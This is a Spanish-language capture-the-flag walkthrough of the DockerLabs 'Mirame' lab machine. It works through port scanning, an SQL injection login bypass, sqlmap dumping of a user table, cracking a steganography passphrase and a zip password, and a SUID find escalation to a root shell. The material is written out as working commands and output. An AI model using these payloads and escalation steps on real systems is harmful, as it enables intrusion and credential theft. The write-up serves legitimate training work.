#MAQUINA #DOCKERLABS #FACIL
#SQLI 
#SQLMAP #STEGSEEK
<hr>

# RECONOCIMIENTO

Vamos a resolver **Mirame** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS --min-rate 5000 -vvv -n -Pn -p- 172.17.0.2 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-10 08:44 CET
Initiating ARP Ping Scan at 08:44
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 08:44, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 08:44
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Completed SYN Stealth Scan at 08:44, 0.53s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000040s latency).
Scanned at 2024-12-10 08:44:10 CET for 0s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.69 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)


```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** y el puerto **22(SSH)** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p22,80 172.17.0.2                              
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-10 08:44 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.000018s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 2c:ea:4a:d7:b4:c3:d4:e2:65:29:6c:12:c4:58:c9:49 (ECDSA)
|_  256 a7:a4:a4:2e:3b:c6:0a:e4:ec:bd:46:84:68:02:5d:30 (ED25519)
80/tcp open  http    Apache httpd 2.4.61 ((Debian))
|_http-title: Login Page
|_http-server-header: Apache/2.4.61 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.60 seconds



```

   ```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-10 08:44 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.0000030s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds

whatweb "http://172.17.0.2/"
http://172.17.0.2/ [200 OK] Apache[2.4.61], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.61 (Debian)], IP[172.17.0.2], PasswordField[password], Title[Login Page]


```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.
# EXPLOTACION

Al revisar la web que hay en el puerto 80, vemos que hay un login. 
Al meter una contra cualquiera y meterle como usuario -> **a' or 1=1 -- -** , nos deja pasar, por lo que es vulnerable a un SQLI, vamos a automatizarlo usando **sqlmap**

   ```bash

sqlmap -u "http://172.17.0.2/" --batch --forms --dbs                      

available databases [5]:
[*] information_schema
[*] users

sqlmap -u "http://172.17.0.2/" --batch --forms -D users --tables

Database: users
[1 table]
+----------+
| usuarios |
+----------+

sqlmap -u "http://172.17.0.2/" --batch --forms -D users -T usuarios --dump

Database: users
Table: usuarios
[4 entries]
+----+------------------------+------------+
| id | password               | username   |
+----+------------------------+------------+
| 1  | chocolateadministrador | admin      |
| 2  | lucas                  | lucas      |
| 3  | soyagustin123          | agustin    |
| 4  | directoriotravieso     | directorio |
+----+------------------------+------------+



```

Tras probar las claves, ninguna parece funcionar. Pero, descubrimos que **directoriotravieso** es un directorio de la web.

Tenemos una foto que se llama mirame bien, tras usar exiftool y steghide no tenemos resultados.
Usamos **stegseek** para sacar la passphrase si es débil :

   ```bash

stegseek extract -sf miramebien.jpg -wl /usr/share/wordlists/rockyou.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "chocolate"
[i] Original filename: "ocultito.zip".
[i] Extracting to "miramebien.jpg.out".

   ```

El archivo se encuentra cifrado, asi que usaremos **john**:

   ```bash

zip2john miramebien.jpg.out > x
ver 1.0 efh 5455 efh 7875 miramebien.jpg.out/secret.txt PKZIP Encr: 2b chk, TS_chk, cmplen=28, decmplen=16, crc=703553BA ts=9D7A cs=9d7a type=0
                                                                                                                                                      

john x --show
miramebien.jpg.out/secret.txt:stupid1:secret.txt:miramebien.jpg.out::miramebien.jpg.out

1 password hash cracked, 0 left

   ```

Ahora lo unzipeamos con la password **stupid1**.

Tenemos credenciales -> **carlos:carlitos**

# ESCALADA PRIVILEGIOS

Buscamos archivos con permisos SUID:
   ```bash
carlos@38d071a389da:~$ find / -perm -4000 2>/dev/null 
/usr/bin/su
/usr/bin/find
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/sudo
/usr/lib/mysql/plugin/auth_pam_tool_dir/auth_pam_tool
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Vemos **find** con permisos SUID :
   ```bash

carlos@38d071a389da:~$ find . -exec /bin/sh -p \; -quit
# whoami
root
# 

```

**YA ESTAMOS COMO ROOT.**